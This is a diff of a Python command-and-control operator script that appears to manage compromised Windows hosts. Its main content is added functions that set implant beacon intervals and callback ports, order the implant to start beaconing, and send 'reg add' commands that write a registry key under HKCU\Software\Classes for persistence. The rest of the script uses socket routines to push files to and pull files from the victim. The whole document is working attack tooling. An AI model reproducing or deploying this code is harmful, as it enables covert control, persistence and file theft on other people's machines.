@@ -1,11 +1,11 @@
 #!/usr/bin/python3
 
-import os,sys
+import os,sys,persist
 abspath = os.path.abspath(sys.argv[0])
 dname = os.path.dirname(abspath)
 os.chdir(dname)
 
-import socket, ssl, persist, beacon
+import socket, ssl
 import argparse, shlex
 from socket import AF_INET, SOCK_STREAM, SO_REUSEADDR, SOL_SOCKET, SHUT_RDWR
 from printlib import *
@@ -20,7 +20,7 @@ DEBUG = True
 CURRENT_WORKING_DIR = ""
 TASK_FILES_LOCATION = "tasks"
 CONNECTED_HOST = None
-CONFIG = {"TCP_TIMEOUT": 1, "VERBOSE": True, "DEBUG": True}
+CONFIG = {"TCP_TIMEOUT": .3, "VERBOSE": True, "DEBUG": True}
 #IGNORE SSL CHECKS
 
 try:
@@ -126,6 +126,63 @@ def delete_keys():
         remove("server_key")
     except FileNotFoundError:
         pass
+
+############################################################### 
+###############################################################
+###############################################################
+
+def configure_beacon(conn):
+    query_beacon_config(conn)
+    ans = print_question_list("New Beacon Interval (sec)")
+    send_data(conn, "[BEACON]{}".format(ans))
+
+def change_beacon_port(conn):
+    ans = print_question_list("Select Option","1 - Query Callback Port Config","2 - Set Callback Port")
+    if ans == "1":
+        send_data(conn, "[PORT]?")
+        print_info("Current Callback Port:")
+        listen_for_data(conn)
+    elif ans == "2":
+        ans = print_question("Enter new callback port")
+        send_data(conn, "[PORT]{}".format(ans))
+
+def query_beacon_config(conn):
+    send_data(conn, "[BEACON]?")
+    print_info("Current Setting (sec):")
+    listen_for_data(conn)
+
+def start_beaconing(conn):
+    send_data(conn, "[BEACON]START")
+    kill(getpid(), SIGTERM)
+
+def save_beacon_config(conn):
+    #send_data(conn, "[BEACON]?")
+    #print_info("Current Setting (sec):")
+    #recv_data(conn)
+    
+    ans = print_question("Enter Desired Beacon to Save on HDD")
+    cmd1 = r"reg add HKEY_CURRENT_USER\Software\Classes\.savep /f"
+    cmd2 = r"reg add HKEY_CURRENT_USER\Software\Classes\.savep /d {p} /f".format(p=ans)
+    print_info("Beacon Command Settings to Run:\n{}\n{}".format(cmd1,cmd2))
+    ans = print_question("Run? [y/n]")
+    if ans.lower() == "y":
+        print_info("Running cmd1")
+        send_data(conn, cmd1)
+        listen_for_data(conn)
+        print_info("Running cmd2")
+        send_data(conn, cmd2)
+        listen_for_data(conn)
+
+def delete_beacon_reg(conn):
+    print_info("Removing Registry Setting")
+    cmd = r"reg delete HKEY_CURRENT_USER\Software\Classes\.savep /f"
+    send_data(conn, cmd)
+    listen_for_data(conn)
+
+###############################################################
+###############################################################
+###############################################################
+
 def send_data(s, plain_text):
     msg = plain_text + "[END]"
     s.send(msg.encode('utf-8'))
@@ -135,10 +192,10 @@ def send_data(s, plain_text):
 
 def file_transfer_get(conn, filename):      #get file from server
     send_data(conn,"[transfer]")
-    filesize = int(conn.recv(128).decode()[11:])
+    filesize = int(conn.recv(1024).decode()[11:])
     current_size = 0
     print_info(f"Total Size: {filesize}")
-    bytes_read = conn.recv(128)
+    bytes_read = conn.recv(1024)
     
     try:
         print_info("Transferring...")
@@ -147,7 +204,7 @@ def file_transfer_get(conn, filename):      #get file from server
                 ticker = round(100*current_size/filesize)
                 print(f"{ticker}%",end="\r")
                 f.write(bytes_read)
-                bytes_read = conn.recv(128)
+                bytes_read = conn.recv(1024)
                 current_size = os.path.getsize(filename)
         print()
         if CONFIG['VERBOSE']:
@@ -166,12 +223,12 @@ def file_transfer_put(conn, commands):       #push file to server
     if CONFIG['VERBOSE']:
         print_info("Trying to open: {}".format(file_name))
     f = open(file_name, 'rb')
-    data = f.read(128)
+    data = f.read(1024)
     if CONFIG['VERBOSE']:
         print_info("Sending File:\n" + file_name)
     while data:
         conn.send(data)
-        data = f.read(128)
+        data = f.read(1024)
     conn.send("[END]".encode('utf-8'))
     f.close()
 
@@ -182,7 +239,7 @@ def listen_for_data(conn, mode="print",encoding="b64"):
             print_info("Waiting for data...")
 
         recv_total = ""
-        recv_data = conn.recv(128).decode('utf-8')
+        recv_data = conn.recv(64).decode('utf-8')
         if encoding == "b64":
             recv_total = base64_decode(recv_data)
         else:
@@ -193,12 +250,13 @@ def listen_for_data(conn, mode="print",encoding="b64"):
                 recv_total = recv_total + base64_decode(recv_data)
             else:
                 recv_total = recv_total + recv_data
-            recv_data = conn.recv(128).decode('utf-8')
+            recv_data = conn.recv(64).decode('utf-8')
         if mode != "print":
             return recv_total[:-5]
         else:
             print(WHITE + recv_total[:-5] + RSTCOLORS)
     except socket.timeout:
+        print("TIMEOUT")
         print(recv_total[:-5])
     except Exception as e:
         print(exc_info())
@@ -350,6 +408,8 @@ def listen():
     #delete_keys()
     bindsocket = socket.socket()
     bindsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    bindsocket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+    #bindsocket.setblocking(0)
     bindsocket.bind((listen_addr, listen_port))
     bindsocket.listen(1)
     try:
@@ -490,7 +550,7 @@ def listen():
                     kill_session(conn, source)
                     exit_flag = True
                 elif cmd == "4":        #start beaconing
-                    beacon.start_beaconing(conn)
+                    start_beaconing(conn)
                 elif cmd == "5":
                     ans = print_question("Select a Module:\n1 - Add\n2 - Query\n3 - Remove\n")
                     if ans == "1":
@@ -542,15 +602,15 @@ def listen():
                                             "5 - Delete Setting in Registry")
 
                     if ans == "1":
-                        beacon.query(conn)                            
+                        query_beacon_config(conn)                            
                     elif ans == "2":    
-                        beacon.configure(conn)
+                        configure_beacon(conn)
                     elif ans == "3":    
-                        beacon.change_port(conn)
+                        change_beacon_port(conn)
                     elif ans == "4":
-                        beacon.save_beacon(conn)
+                        save_beacon_config(conn)
                     elif ans == "5":
-                        beacon.delete_beacon_reg(conn)
+                        delete_beacon_reg(conn)
                     else:
                         cmd = ""
                 elif cmd == "":
@@ -573,7 +633,7 @@ def listen():
                     cmd = ""
 
         except KeyboardInterrupt:
-            beacon.start_beaconing(conn)
+            start_beaconing(conn)
             conn.shutdown(socket.SHUT_RDWR)
             conn.close()
         except Exception as e:
